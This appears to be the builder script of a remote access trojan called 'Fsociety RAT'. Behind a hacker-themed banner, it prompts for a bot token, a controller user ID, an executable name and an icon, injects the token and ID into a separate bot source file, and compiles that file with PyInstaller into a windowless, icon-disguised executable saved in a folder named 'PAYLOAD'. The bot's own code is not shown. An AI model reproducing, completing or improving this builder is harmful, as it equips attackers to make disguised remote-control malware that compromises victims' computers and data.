import os
import shutil
import re
import time

def loading():
    for _ in range(3):
        os.system('cls' if os.name == 'nt' else 'clear') 
        print(r"""
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
XX                                                                          XX
XX   MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM   XX
XX   MMMMMMMMMMMMMMMMMMMMMssssssssssssssssssssssssssMMMMMMMMMMMMMMMMMMMMM   XX
XX   MMMMMMMMMMMMMMMMss'''                          '''ssMMMMMMMMMMMMMMMM   XX
XX   MMMMMMMMMMMMyy''                                    ''yyMMMMMMMMMMMM   XX
XX   MMMMMMMMyy''                                            ''yyMMMMMMMM   XX
XX   MMMMMy''                                                    ''yMMMMM   XX
XX   MMMy'                                                          'yMMM   XX
XX   Mh'                                                              'hM   XX
XX   -                                                                  -   XX
XX                                                                          XX
XX   ::                                                                ::   XX
XX   MMhh.        ..hhhhhh..                      ..hhhhhh..        .hhMM   XX
XX   MMMMMh   ..hhMMMMMMMMMMhh.                .hhMMMMMMMMMMhh..   hMMMMM   XX
XX   ---MMM .hMMMMdd:::dMMMMMMMhh..        ..hhMMMMMMMd:::ddMMMMh. MMM---   XX
XX   MMMMMM MMmm''      'mmMMMMMMMMyy.  .yyMMMMMMMMmm'      ''mmMM MMMMMM   XX
XX   ---mMM ''             'mmMMMMMMMM  MMMMMMMMmm'             '' MMm---   XX
XX   yyyym'    .              'mMMMMm'  'mMMMMm'              .    'myyyy   XX
XX   mm''    .y'     ..yyyyy..  ''''      ''''  ..yyyyy..     'y.    ''mm   XX
XX           MN    .sMMMMMMMMMss.   .    .   .ssMMMMMMMMMs.    NM           XX
XX           N`    MMMMMMMMMMMMMN   M    M   NMMMMMMMMMMMMM    `N           XX
XX            +  .sMNNNNNMMMMMN+   `N    N`   +NMMMMMNNNNNMs.  +            XX
XX              o+++     ++++Mo    M      M    oM++++     +++o              XX
XX                                oo      oo                                XX
XX           oM                 oo          oo                 Mo           XX
XX         oMMo                M              M                oMMo         XX
XX       +MMMM                 s              s                 MMMM+       XX
XX      +MMMMM+            +++NNNN+        +NNNN+++            +MMMMM+      XX
XX     +MMMMMMM+       ++NNMMMMMMMMN+    +NMMMMMMMMNN++       +MMMMMMM+     XX
XX     MMMMMMMMMNN+++NNMMMMMMMMMMMMMMNNNNMMMMMMMMMMMMMMNN+++NNMMMMMMMMM     XX
XX     yMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMy     XX
XX   m  yMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMy  m   XX
XX   MMm yMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMy mMM   XX
XX   MMMm .yyMMMMMMMMMMMMMMMM     MMMMMMMMMM     MMMMMMMMMMMMMMMMyy. mMMM   XX
XX   MMMMd   ''''hhhhh       odddo          obbbo        hhhh''''   dMMMM   XX
XX   MMMMMd             'hMMMMMMMMMMddddddMMMMMMMMMMh'             dMMMMM   XX
XX   MMMMMMd              'hMMMMMMMMMMMMMMMMMMMMMMh'              dMMMMMM   XX
XX   MMMMMMM-               ''ddMMMMMMMMMMMMMMdd''               -MMMMMMM   XX
XX   MMMMMMMM                   '::dddddddd::'                   MMMMMMMM   XX
XX   MMMMMMMM-                                                  -MMMMMMMM   XX
XX   MMMMMMMMM                                                  MMMMMMMMM   XX
XX   MMMMMMMMMy                                                yMMMMMMMMM   XX
XX   MMMMMMMMMMy.                                            .yMMMMMMMMMM   XX
XX   MMMMMMMMMMMMy.                                        .yMMMMMMMMMMMM   XX
XX   MMMMMMMMMMMMMMy.                                    .yMMMMMMMMMMMMMM   XX
XX   MMMMMMMMMMMMMMMMs.                                .sMMMMMMMMMMMMMMMM   XX
XX   MMMMMMMMMMMMMMMMMMss.           ....           .ssMMMMMMMMMMMMMMMMMM   XX
XX   MMMMMMMMMMMMMMMMMMMMNo         oNNNNo         oNMMMMMMMMMMMMMMMMMMMM   XX
XX                                                                          XX
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
            """)
        time.sleep(0.5)
        os.system('cls' if os.name == 'nt' else 'clear')
        time.sleep(0.5)

def FSOCIETY():
    os.system('cls' if os.name == 'nt' else 'clear')
    print("""
    ______                _      __            ____  ___  ______
   / ____/________  _____(_)__  / /___  __    / __ \/   |/_  __/
  / /_  / ___/ __ \/ ___/ / _ \/ __/ / / /   / /_/ / /| | / /   
 / __/ (__  ) /_/ / /__/ /  __/ /_/ /_/ /   / _, _/ ___ |/ /    
/_/   /____/\____/\___/_/\___/\__/\__, /   /_/ |_/_/  |_/_/     
                                 /____/                                                                                        

[*] The world is a dangerous place not because of those who do evil but because of those who look on and do nothing

[+] Version | v1.0
[+] Author  | cybermad
[*] Github  | https://github.com/cybermads
[*] Discord | https://discord.gg/RUc432Nc
""")

def set(token, uid):
    with open("lib/bot.py", "r") as f:
        src = f.read()

    src = re.sub(r'token\s*=\s*".*"', f'token = "{token}"', src)

    try:
        uids = int(uid.strip())
    except:
        pass

    src = re.sub(r'id\s*=\s*\d+', f'id = {uids}', src)

    with open("lib/bot.py", "w") as f:
        f.write(src)


def build(exe, icon):
    if not os.path.exists("PAYLOAD"):
        os.makedirs("PAYLOAD")

    option = f'--icon {icon}' if icon.strip() else ''
    os.system(f'pyinstaller --onefile --clean --name {exe} {option} --noconsole --distpath PAYLOAD lib/bot.py')

    if os.path.exists("build"):
        shutil.rmtree("build")

    if os.path.exists(f"{exe}.spec"):
        os.remove(f"{exe}.spec")

    print("\n[+] saved as PAYLOAD")

if __name__ == "__main__":
    user = os.getlogin()
    loading()
    FSOCIETY()

    token = input("""
┌──(root@FSOCIETY)-[~]
└─# Enter the bot token
                 
┌──(root@FSOCIETY)-[~]
└─# """)
    uid = input("""
┌──(root@FSOCIETY)-[~]
└─# Enter the user ID
                 
┌──(root@FSOCIETY)-[~]
└─# """)

    exe = input("""
┌──(root@FSOCIETY)-[~]
└─# Enter the exe file name
                 
┌──(root@FSOCIETY)-[~]
└─# """)
    icon = input("""
┌──(root@FSOCIETY)-[~]
└─# Enter the image .icon file path
                 
┌──(root@FSOCIETY)-[~]
└─# """)

    set(token, uid)
    build(exe, icon)


